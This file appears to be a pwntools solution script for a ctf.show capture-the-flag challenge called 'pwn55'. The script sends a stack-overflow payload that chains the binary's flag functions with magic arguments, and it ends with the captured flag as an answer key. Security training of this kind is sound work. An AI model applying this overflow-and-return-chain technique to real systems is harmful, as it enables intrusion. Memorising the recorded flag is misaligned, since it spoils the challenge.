#pwn55 ret2libc or bypass
#bypass
from pwn import *
elf = ELF('./pwn')
p = remote('pwn.challenge.ctf.show', 28172)

offset = 0x2C + 0x4
flag1 = elf.sym['flag_func1']
flag2 = elf.sym['flag_func2']
flag = elf.sym['flag']

#payload = b'a' * offset + p32(flag1) + p32(flag2) + p32(flag) + p32(-1397969748) + p32(-1111638595)
payload = flat([cyclic(offset), flag1, flag2, flag, -1397969748, -1111638595])
p.sendline(payload)
p.interactive()
#ctfshow{bd1d749c-ae9b-4cd2-9ea8-35899d88f7f5}